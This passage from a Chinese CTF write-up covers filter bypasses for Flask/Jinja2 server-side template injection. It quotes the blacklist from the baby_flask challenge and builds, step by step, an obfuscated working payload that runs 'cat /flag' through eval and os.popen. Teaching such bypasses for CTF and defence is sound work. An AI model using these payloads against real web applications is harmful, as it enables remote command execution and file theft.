class="nb">set</span> <span class="n">flg</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">fl</span><span class="o">=</span><span class="n">aa</span><span class="p">,</span><span class="n">ag</span><span class="o">=</span><span class="n">dd</span><span class="p">)</span><span class="o">|</span><span class="n">join</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">ev</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">ev</span><span class="o">=</span><span class="n">aa</span><span class="p">,</span><span class="n">al</span><span class="o">=</span><span class="n">dd</span><span class="p">)</span><span class="o">|</span><span class="n">join</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">red</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">re</span><span class="o">=</span><span class="n">aa</span><span class="p">,</span><span class="n">ad</span><span class="o">=</span><span class="n">dd</span><span class="p">)</span><span class="o">|</span><span class="n">join</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">bul</span> <span class="o">=</span> <span class="n">xhx</span><span class="o">*</span><span class="mi">2</span><span class="o">~</span><span class="n">but</span><span class="o">~</span><span class="n">xhx</span><span class="o">*</span><span class="mi">2</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">pld</span> <span class="o">=</span> <span class="n">xhx</span><span class="o">*</span><span class="mi">2</span><span class="o">~</span><span class="n">imp</span><span class="o">~</span><span class="n">xhx</span><span class="o">*</span><span class="mi">2</span><span class="o">~</span><span class="n">left</span><span class="o">~</span><span class="n">yin</span><span class="o">~</span><span class="n">os</span><span class="o">~</span><span class="n">yin</span><span class="o">~</span><span class="n">right</span><span class="o">~</span><span class="n">point</span><span class="o">~</span><span class="n">pon</span><span class="o">~</span><span class="n">left</span><span class="o">~</span><span class="n">yin</span><span class="o">~</span><span class="n">ca</span><span class="o">~</span><span class="n">space</span><span class="o">~</span><span class="n">slas</span><span class="o">~</span><span class="n">flg</span><span class="o">~</span><span class="n">yin</span><span class="o">~</span><span class="n">right</span><span class="o">~</span><span class="n">point</span><span class="o">~</span><span class="n">red</span><span class="o">~</span><span class="n">left</span><span class="o">~</span><span class="n">right</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="k">for</span> <span class="n">f</span><span class="p">,</span><span class="n">v</span> <span class="ow">in</span> <span class="n">whoami</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">items</span><span class="p">()</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="k">if</span> <span class="n">f</span> <span class="o">==</span> <span class="n">bul</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="k">for</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span> <span class="ow">in</span> <span class="n">v</span><span class="o">.</span><span class="n">items</span><span class="p">()</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="k">if</span> <span class="n">a</span> <span class="o">==</span> <span class="n">ev</span> <span class="o">%</span><span class="p">}{{</span><span class="n">b</span><span class="p">(</span><span class="n">pld</span><span class="p">)}}{</span><span class="o">%</span> <span class="n">endif</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="n">endfor</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="n">endif</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="n">endfor</span> <span class="o">%</span><span class="p">}</span>
</pre></div>
<p><a id="img16" href="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174702-287d6fde-bd3e-1.png"><img src="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174702-287d6fde-bd3e-1.png"></a></p>
<p>如上图所示，成功执行命令并得到了flag。</p>
<h3 id="toc-32">[2021 MAR &amp; DASCTF]baby_flask</h3>
<p>当时这道题没做出来，这里我们在本地使用vulnhub中的flask搭建环境进行复现：</p>
<p><a id="img17" href="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174703-28a5378a-bd3e-1.png"><img src="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174703-28a5378a-bd3e-1.png"></a></p>
<p>在 <code>/getname?name=</code> 处存在SSTI。</p>
<p>F12查看源代码发现提示过滤了一下字符：</p>
<div class="highlight"><pre><span></span><span class="n">blacklist</span><span class="o">&lt;/</span><span class="n">br</span><span class="o">&gt;</span>   
<span class="s1">'.'</span><span class="p">,</span><span class="s1">'['</span><span class="p">,</span><span class="s1">'</span><span class="se">\'</span><span class="s1">'</span><span class="p">,</span><span class="s1">'"'</span><span class="p">,</span><span class="s1">'</span><span class="se">\\</span><span class="s1">'</span><span class="p">,</span><span class="s1">'+'</span><span class="p">,</span><span class="s1">':'</span><span class="p">,</span><span class="s1">'_'</span><span class="p">,</span><span class="o">&lt;/</span><span class="n">br</span><span class="o">&gt;</span>   
<span class="s1">'chr'</span><span class="p">,</span><span class="s1">'pop'</span><span class="p">,</span><span class="s1">'class'</span><span class="p">,</span><span class="s1">'base'</span><span class="p">,</span><span class="s1">'mro'</span><span class="p">,</span><span class="s1">'init'</span><span class="p">,</span><span class="s1">'globals'</span><span class="p">,</span><span class="s1">'get'</span><span class="p">,</span><span class="o">&lt;/</span><span class="n">br</span><span class="o">&gt;</span>   
<span class="s1">'eval'</span><span class="p">,</span><span class="s1">'exec'</span><span class="p">,</span><span class="s1">'os'</span><span class="p">,</span><span class="s1">'popen'</span><span class="p">,</span><span class="s1">'open'</span><span class="p">,</span><span class="s1">'read'</span><span class="p">,</span><span class="o">&lt;/</span><span class="n">br</span><span class="o">&gt;</span>   
<span class="s1">'select'</span><span class="p">,</span><span class="s1">'url_for'</span><span class="p">,</span><span class="s1">'get_flashed_messages'</span><span class="p">,</span><span class="s1">'config'</span><span class="p">,</span><span class="s1">'request'</span><span class="p">,</span><span class="o">&lt;/</span><span class="n">br</span><span class="o">&gt;</span>   
<span class="s1">'count'</span><span class="p">,</span><span class="s1">'length'</span><span class="p">,</span><span class="s1">'０'</span><span class="p">,</span><span class="s1">'１'</span><span class="p">,</span><span class="s1">'２'</span><span class="p">,</span><span class="s1">'３'</span><span class="p">,</span><span class="s1">'４'</span><span class="p">,</span><span class="s1">'５'</span><span class="p">,</span><span class="s1">'６'</span><span class="p">,</span><span class="s1">'７'</span><span class="p">,</span><span class="s1">'８'</span><span class="p">,</span><span class="s1">'９'</span><span class="p">,</span><span class="s1">'0'</span><span class="p">,</span><span class="s1">'1'</span><span class="p">,</span><span class="s1">'2'</span><span class="p">,</span><span class="s1">'3'</span><span class="p">,</span><span class="s1">'4'</span><span class="p">,</span><span class="s1">'5'</span><span class="p">,</span><span class="s1">'6'</span><span class="p">,</span><span class="s1">'7'</span><span class="p">,</span><span class="s1">'8'</span><span class="p">,</span><span class="s1">'9'</span><span class="o">&lt;/</span><span class="n">br</span><span class="o">&gt;</span>
</pre></div>
<p>过滤的死死地，甚至将所有的数字都过滤了。我们仍然可以使用通过滤器进行绕过，经过之前那道题的演示，我们可以很容易的构造出被过滤了的字符或字符串。</p>
<p>Payload构造过程如下：</p>
<div class="highlight"><pre><span></span><span class="c1"># 首先构造出所需的数字: </span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">zero</span> <span class="o">=</span> <span class="p">(</span><span class="bp">self</span><span class="o">|</span><span class="nb">int</span><span class="p">)</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># 0, 也可以使用lenght过滤器获取数字</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">one</span> <span class="o">=</span> <span class="p">(</span><span class="n">zero</span><span class="o">**</span><span class="n">zero</span><span class="p">)</span><span class="o">|</span><span class="nb">int</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># 1</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">two</span> <span class="o">=</span> <span class="p">(</span><span class="n">zero</span><span class="o">-</span><span class="n">one</span><span class="o">-</span><span class="n">one</span><span class="p">)</span><span class="o">|</span><span class="nb">abs</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># 2</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">four</span> <span class="o">=</span> <span class="p">(</span><span class="n">two</span><span class="o">*</span><span class="n">two</span><span class="p">)</span><span class="o">|</span><span class="nb">int</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># 4</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">five</span> <span class="o">=</span> <span class="p">(</span><span class="n">two</span><span class="o">*</span><span class="n">two</span><span class="o">*</span><span class="n">two</span><span class="p">)</span><span class="o">-</span><span class="n">one</span><span class="o">-</span><span class="n">one</span><span class="o">-</span><span class="n">one</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># 5</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">three</span> <span class="o">=</span> <span class="n">five</span><span class="o">-</span><span class="n">one</span><span class="o">-</span><span class="n">one</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># 3</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">nine</span> <span class="o">=</span> <span class="p">(</span><span class="n">two</span><span class="o">*</span><span class="n">two</span><span class="o">*</span><span class="n">two</span><span class="o">*</span><span class="n">two</span><span class="o">-</span><span class="n">five</span><span class="o">-</span><span class="n">one</span><span class="o">-</span><span class="n">one</span><span class="p">)</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># 9</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">seven</span> <span class="o">=</span> <span class="p">(</span><span class="n">zero</span><span class="o">-</span><span class="n">one</span><span class="o">-</span><span class="n">one</span><span class="o">-</span><span class="n">five</span><span class="p">)</span><span class="o">|</span><span class="nb">abs</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># 7</span>

<span class="c1"># 构造出所需的各种字符与字符串: </span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">space</span> <span class="o">=</span> <span class="bp">self</span><span class="o">|</span><span class="n">string</span><span class="o">|</span><span class="nb">min</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># 空格</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">point</span> <span class="o">=</span> <span class="bp">self</span><span class="o">|</span><span class="nb">float</span><span class="o">|</span><span class="n">string</span><span class="o">|</span><span class="nb">min</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># .</span>

<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">c</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">c</span><span class="o">=</span><span class="n">aa</span><span class="p">)</span><span class="o">|</span><span class="n">reverse</span><span class="o">|</span><span class="n">first</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># 字符 c</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">bfh</span> <span class="o">=</span> <span class="bp">self</span><span class="o">|</span><span class="n">string</span><span class="o">|</span><span class="n">urlencode</span><span class="o">|</span><span class="n">first</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># 百分号 %</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">bfhc</span> <span class="o">=</span> <span class="n">bfh</span><span class="o">~</span><span class="n">c</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># 这里构造了%c, 之后可以利用这个%c构造任意字符。~用于字符连接</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">slas</span> <span class="o">=</span> <span class="n">bfhc</span><span class="o">%</span><span class="p">((</span><span class="n">four</span><span class="o">~</span><span class="n">seven</span><span class="p">)</span><span class="o">|</span><span class="nb">int</span><span class="p">)</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># 使用%c构造斜杠 /</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">yin</span> <span class="o">=</span> <span class="n">bfhc</span><span class="o">%</span><span class="p">((</span><span class="n">three</span><span class="o">~</span><span class="n">nine</span><span class="p">)</span><span class="o">|</span><span class="nb">int</span><span class="p">)</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># 使用%c构造引号 '</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">xhx</span> <span class="o">=</span> <span class="n">bfhc</span><span class="o">%</span><span class="p">((</span><span class="n">nine</span><span class="o">~</span><span class="n">five</span><span class="p">)</span><span class="o">|</span><span class="nb">int</span><span class="p">)</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># 使用%c构造下划线 _</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">right</span> <span class="o">=</span> <span class="n">bfhc</span><span class="o">%</span><span class="p">((</span><span class="n">four</span><span class="o">~</span><span class="n">one</span><span class="p">)</span><span class="o">|</span><span class="nb">int</span><span class="p">)</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># 使用%c构造右括号 )</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">left</span> <span class="o">=</span> <span class="n">bfhc</span><span class="o">%</span><span class="p">((</span><span class="n">four</span><span class="o">~</span><span class="n">zero</span><span class="p">)</span><span class="o">|</span><span class="nb">int</span><span class="p">)</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># 使用%c构造左括号 (</span>

<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">but</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">buil</span><span class="o">=</span><span class="n">aa</span><span class="p">,</span><span class="n">tins</span><span class="o">=</span><span class="n">dd</span><span class="p">)</span><span class="o">|</span><span class="n">join</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># builtins</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">imp</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">imp</span><span class="o">=</span><span class="n">aa</span><span class="p">,</span><span class="n">ort</span><span class="o">=</span><span class="n">dd</span><span class="p">)</span><span class="o">|</span><span class="n">join</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># import</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">pon</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">po</span><span class="o">=</span><span class="n">aa</span><span class="p">,</span><span class="n">pen</span><span class="o">=</span><span class="n">dd</span><span class="p">)</span><span class="o">|</span><span class="n">join</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># popen</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">so</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">o</span><span class="o">=</span><span class="n">aa</span><span class="p">,</span><span class="n">s</span><span class="o">=</span><span class="n">dd</span><span class="p">)</span><span class="o">|</span><span class="n">join</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># os</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">ca</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">ca</span><span class="o">=</span><span class="n">aa</span><span class="p">,</span><span class="n">t</span><span class="o">=</span><span class="n">dd</span><span class="p">)</span><span class="o">|</span><span class="n">join</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># cat</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">flg</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">fl</span><span class="o">=</span><span class="n">aa</span><span class="p">,</span><span class="n">ag</span><span class="o">=</span><span class="n">dd</span><span class="p">)</span><span class="o">|</span><span class="n">join</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># flag</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">ev</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">ev</span><span class="o">=</span><span class="n">aa</span><span class="p">,</span><span class="n">al</span><span class="o">=</span><span class="n">dd</span><span class="p">)</span><span class="o">|</span><span class="n">join</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># eval</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">red</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">re</span><span class="o">=</span><span class="n">aa</span><span class="p">,</span><span class="n">ad</span><span class="o">=</span><span class="n">dd</span><span class="p">)</span><span class="o">|</span><span class="n">join</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># read</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">bul</span> <span class="o">=</span> <span class="n">xhx</span><span class="o">~</span><span class="n">xhx</span><span class="o">~</span><span class="n">but</span><span class="o">~</span><span class="n">xhx</span><span class="o">~</span><span class="n">xhx</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># __builtins__</span>

<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">ini</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">ini</span><span class="o">=</span><span class="n">aa</span><span class="p">,</span><span class="n">t</span><span class="o">=</span><span class="n">bb</span><span class="p">)</span><span class="o">|</span><span class="n">join</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># init</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">glo</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">glo</span><span class="o">=</span><span class="n">aa</span><span class="p">,</span><span class="n">bals</span><span class="o">=</span><span class="n">bb</span><span class="p">)</span><span class="o">|</span><span class="n">join</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># globals</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">itm</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">ite</span><span class="o">=</span><span class="n">aa</span><span class="p">,</span><span class="n">ms</span><span class="o">=</span><span class="n">bb</span><span class="p">)</span><span class="o">|</span><span class="n">join</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># items</span>

<span class="c1"># 将上面构造的字符或字符串拼接起来构造出 __import__('os').popen('cat /flag').read(): </span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">pld</span> <span class="o">=</span> <span class="n">xhx</span><span class="o">~</span><span class="n">xhx</span><span class="o">~</span><span class="n">imp</span><span class="o">~</span><span class="n">xhx</span><span class="o">~</span><span class="n">xhx</span><span class="o">~</span><span class="n">left</span><span class="o">~</span><span class="n">yin</span><span class="o">~</span><span class="n">so</span><span class="o">~</span><span class="n">yin</span><span class="o">~</span><span class="n">right</span><span class="o">~</span><span class="n">point</span><span class="o">~</span><span class="n">pon</span><span class="o">~</span><span class="n">left</span><span class="o">~</span><span class="n">yin</span><span class="o">~</span><span class="n">ca</span><span class="o">~</span><span class="n">space</span><span class="o">~</span><span class="n">slas</span><span class="o">~</span><span class="n">flg</span><span class="o">~</span><span class="n">yin</span><span class="o">~</span><span class="n">right</span><span class="o">~</span><span class="n">point</span><span class="o">~</span><span class="n">red</span><span class="o">~</span><span class="n">left</span><span class="o">~</span><span class="n">right</span> <span class="o">%</span><span class="p">}</span>

<span class="c1"># 然后将上面构造的各种变量添加到SSTI万能payload里面就行了: </span>
<span class="p">{</span><span class="o">%</span> <span class="k">for</span> <span class="n">f</span><span class="p">,</span><span class="n">v</span> <span class="ow">in</span> <span class="p">(</span><span class="n">whoami</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">xhx</span><span class="o">~</span><span class="n">xhx</span><span class="o">~</span><span class="n">ini</span><span class="o">~</span><span class="n">xhx</span><span class="o">~</span><span class="n">xhx</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">xhx</span><span class="o">~</span><span class="n">xhx</span><span class="o">~</span><span class="n">glo</span><span class="o">~</span><span class="n">xhx</span><span class="o">~</span><span class="n">xhx</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">itm</span><span class="p">))()</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># globals</span>
    <span class="p">{</span><span class="o">%</span> <span class="k">if</span> <span class="n">f</span> <span class="o">==</span> <span class="n">bul</span> <span class="o">%</span><span class="p">}</span> 
        <span class="p">{</span><span class="o">%</span> <span class="k">for</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span> <span class="ow">in</span> <span class="p">(</span><span class="n">v</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">itm</span><span class="p">))()</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># builtins</span>
            <span class="p">{</span><span class="o">%</span> <span class="k">if</span> <span class="n">a</span> <span class="o">==</span> <span class="n">ev</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># eval</span>
                <span class="p">{{</span><span class="n">b</span><span class="p">(</span><span class="n">pld</span><span class="p">)}}</span>    <span class="c1"># eval("__import__('os').popen('cat /flag').read()")</span>
            <span class="p">{</span><span class="o">%</span> <span class="n">endif</span> <span class="o">%</span><span class="p">}</span>
        <span class="p">{</span><span class="o">%</span> <span class="n">endfor</span> <span class="o">%</span><span class="p">}</span>
    <span class="p">{</span><span class="o">%</span> <span class="n">endif</span> <span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span> <span class="n">endfor</span> <span class="o">%</span><span class="p">}</span>

<span class="c1"># 最后的payload如下:</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">zero</span> <span class="o">=</span> <span class="p">(</span><span class="bp">self</span><span class="o">|</span><span class="nb">int</span><span class="p">)</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">one</span> <span class="o">=</span> <span class="p">(</span><span class="n">zero</span><span class="o">**</span><span class="n">zero</span><span class="p">)</span><span class="o">|</span><span class="nb">int</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">two</span> <span class="o">=</span> <span class="p">(</span><span class="n">zero</span><span class="o">-</span><span class="n">one</span><span class="o">-</span><span class="n">one</span><span class="p">)</span><span class="o">|</span><span class="nb">abs</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">four</span> <span class="o">=</span> <span class="p">(</span><span class="n">two</span><span class="o">*</span><span class="n">two</span><span class="p">)</span><span class="o">|</span><span class="nb">int</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">five</span> <span class="o">=</span> <span class="p">(</span><span class="n">two</span><span class="o">*</span><span class="n">two</span><span class="o">*</span><span class="n">two</span><span class="p">)</span><span class="o">-</span><span class="n">one</span><span class="o">-</span><span class="n">one</span><span class="o">-</span><span class="n">one</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">three</span> <span class="o">=</span> <span class="n">five</span><span class="o">-</span><span class="n">one</span><span class="o">-</span><span class="n">one</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">nine</span> <span class="o">=</span> <span class="p">(</span><span class="n">two</span><span class="o">*</span><span class="n">two</span><span class="o">*</span><span class="n">two</span><span class="o">*</span><span class="n">two</span><span class="o">-</span><span class="n">five</span><span class="o">-</span><span class="n">one</span><span class="o">-</span><span class="n">one</span><span class="p">)</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">seven</span> <span class="o">=</span> <span class="p">(</span><span class="n">zero</span><span class="o">-</span><span class="n">one</span><span class="o">-</span><span class="n">one</span><span class="o">-</span><span class="n">five</span><span class="p">)</span><span class="o">|</span><span class="nb">abs</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">space</span> <span class="o">=</span> <span class="bp">self</span><span class="o">|</span><span class="n">string</span><span class="o">|</span><span class="nb">min</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">point</span> <span class="o">=</span> <span class="bp">self</span><span class="o">|</span><span class="nb">float</span><span class="o">|</span><span class="n">string</span><span class="o">|</span><span class="nb">min</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">c</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">c</span><span class="o">=</span><span class="n">aa</span><span class="p">)</span><span class="o">|</span><span class="n">reverse</span><span class="o">|</span><span class="n">first</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">bfh</span> <span class="o">=</span> <span class="bp">self</span><span class="o">|</span><span class="n">string</span><span class="o">|</span><span class="n">urlencode</span><span class="o">|</span><span class="n">first</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">bfhc</span> <span class="o">=</span> <span class="n">bfh</span><span class="o">~</span><span class="n">c</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">slas</span> <span class="o">=</span> <span class="n">bfhc</span><span class="o">%</span><span class="p">((</span><span class="n">four</span><span class="o">~</span><span class="n">seven</span><span class="p">)</span><span class="o">|</span><span class="nb">int</span><span class="p">)</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">yin</span> <span class="o">=</span> <span class="n">bfhc</span><span class="o">%</span><span class="p">((</span><span class="n">three</span><span class="o">~</span><span class="n">nine</span><span class="p">)</span><span class="o">|</span><span class="nb">int</span><span class="p">)</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">xhx</span> <span class="o">=</span> <span class="n">bfhc</span><span class="o">%</span><span class="p">((</span><span class="n">nine</span><span class="o">~</span><span class="n">five</span><span class="p">)</span><span class="o">|</span><span class="nb">int</span><span class="p">)</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">right</span> <span class="o">=</span> <span class="n">bfhc</span><span class="o">%</span><span class="p">((</span><span class="n">four</span><span class="o">~</span><span class="n">one</span><span class="p">)</span><span class="o">|</span><span class="nb">int</span><span class="p">)</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">left</span> <span class="o">=</span> <span class="n">bfhc</span><span class="o">%</span><span class="p">((</span><span class="n">four</span><span class="o">~</span><span class="n">zero</span><span class="p">)</span><span class="o">|</span><span class="nb">int</span><span class="p">)</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">but</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">buil</span><span class="o">=</span><span class="n">aa</span><span class="p">,</span><span class="n">tins</span><span class="o">=</span><span class="n">dd</span><span class="p">)</span><span class="o">|</span><span class="n">join</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">imp</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">imp</span><span class="o">=</span><span class="n">aa</span><span class="p">,</span><span class="n">ort</span><span class="o">=</span><span class="n">dd</span><span class="p">)</span><span class="o">|</span><span class="n">join</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">pon</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">po</span><span class="o">=</span><span class="n">aa</span><span class="p">,</span><span class="n">pen</span><span class="o">=</span><span class="n">dd</span><span class="p">)</span><span class="o">|</span><span class="n">join</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">so</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">o</span><span class="o">=</span><span class="n">aa</span><span class="p">,</span><span class="n">s</span><span class="o">=</span><span class="n">dd</span><span class="p">)</span><span class="o">|</span><span class="n">join</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">ca</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">ca</span><span class="o">=</span><span class="n">aa</span><span class="p">,</span><span class="n">t</span><span class="o">=</span><span class="n">dd</span><span class="p">)</span><span class="o">|</span><span class="n">join</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">flg</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">fl</span><span class="o">=</span><span class="n">aa</span><span class="p">,</span><span class="n">ag</span><span class="o">=</span><span class="n">dd</span><span class="p">)</span><span class="o">|</span><span class="n">join</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">ev</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">ev</span><span class="o">=</span><span class="n">aa</span><span class="p">,</span><span class="n">al</span><span class="o">=</span><span class="n">dd</span><span class="p">)</span><span class="o">|</span><span class="n">join</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">red</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">re</span><span class="o">=</span><span class="n">aa</span><span class="p">,</span><span class="n">ad</span><span class="o">=</span><span class="n">dd</span><span class="p">)</span><span class="o">|</span><span class="n">join</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">bul</span> <span class="o">=</span> <span class="n">xhx</span><span class="o">~</span><span class="n">xhx</span><span class="o">~</span><span class="n">but</span><span class="o">~</span><span class="n">xhx</span><span class="o">~</span><span class="n">xhx</span> <span class="o">%</span><span class="p">}{</span><span 